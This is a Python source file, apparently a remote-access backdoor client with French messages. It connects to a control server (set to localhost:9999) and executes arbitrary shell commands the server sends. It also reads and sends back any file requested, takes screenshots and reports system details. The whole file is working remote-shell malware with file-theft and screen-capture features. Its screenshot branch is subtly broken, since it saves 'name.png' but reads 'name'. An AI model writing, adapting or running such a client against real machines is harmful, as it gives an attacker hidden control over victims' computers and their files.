import socket
import time
import subprocess
import platform
import os
from PIL import ImageGrab
from PIL import Image



HOST_IP = 'LOCALHOST'
HOST_PORT = 9999
MAX_DATA_SIZE = 1024

print(f"Connexion au serveur {HOST_IP}:{HOST_PORT}".format(HOST_IP=HOST_IP, HOST_PORT=HOST_PORT))
while True:
    try:
        s = socket.socket()
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print(f"La connexion a été refusée par {HOST_IP}:{HOST_PORT}, reconnexion...".format(HOST_IP=HOST_IP, HOST_PORT=HOST_PORT), )
        time.sleep(4)
    else:
        print(f"Connexion établie avec {HOST_IP}:{HOST_PORT}".format(HOST_IP=HOST_IP, HOST_PORT=HOST_PORT))
        break

while True:
    commande_data = s.recv(MAX_DATA_SIZE)
    if not commande_data:
        break
    commande = commande_data.decode()
    print("Commande: ", commande)


    commande_split = commande.split(" ")
    if commande == "infos":
            reponse = platform.platform() + " " + " " + platform.version()  + " " + os.getcwd()
            reponse = reponse.encode()
    elif len(commande_split) == 2 and commande_split[0] == "cd":
        try:
            os.chdir(commande_split[1].strip("'"))
            reponse = " "
        except FileNotFoundError:
            reponse = "Dossier introuvable"
        reponse = reponse.encode()
    elif len(commande_split) == 2 and commande_split[0] == "dl":
        try:
            f = open(commande_split[1], "rb")
        except FileNotFoundError:
            reponse = " ".encode()
        else:
            reponse = f.read()
            f.close()
    elif len(commande_split) == 2 and commande_split[0] == "capture":
        capture_ecran = ImageGrab.grab()
        capture_filename = commande_split[1] + ".png"
        capture_ecran.save(capture_filename, "PNG")
        try:
            f = open(commande_split[1], "rb")
        except FileNotFoundError:
            reponse = " ".encode()
        else:
            reponse = f.read()
            f.close()
    else:
        resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
        reponse = resultat.stdout + resultat.stderr
        if not reponse or len(reponse) == 0:
            reponse = " "
        reponse = reponse.encode()

    data_len = len(reponse)
    header = str(data_len).zfill(13)
    print("header:", header)
    s.sendall(header.encode())
    if data_len > 0:
        s.sendall(reponse)


s.close()
